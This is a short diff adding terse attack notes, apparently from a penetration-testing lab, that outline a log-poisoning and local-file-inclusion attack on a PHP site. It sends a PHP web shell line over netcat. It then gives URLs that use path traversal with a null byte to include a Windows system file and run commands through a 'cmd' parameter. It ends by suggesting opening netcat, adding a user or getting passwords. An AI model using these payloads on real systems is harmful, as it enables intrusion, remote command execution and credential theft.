@@ -1,0 +1,15 @@
+1.
+
+nc -nv 10.11.8.148 80
+<?php echo shell_exec($_GET['cmd']);?>
+
+
+2.
+
+then from the url:
+
+http://~~~~/comment.php?id=../../../../../../../../windows/system32/drivers/etc/hosts%00
+
+http://~~~~/comment.php?id=111&cmd=ipconfig&lang=../../../../../../../../windows/system32/drivers/etc/hosts%00
+
+you can open nc from cmd= or add a new user or get the passwords.
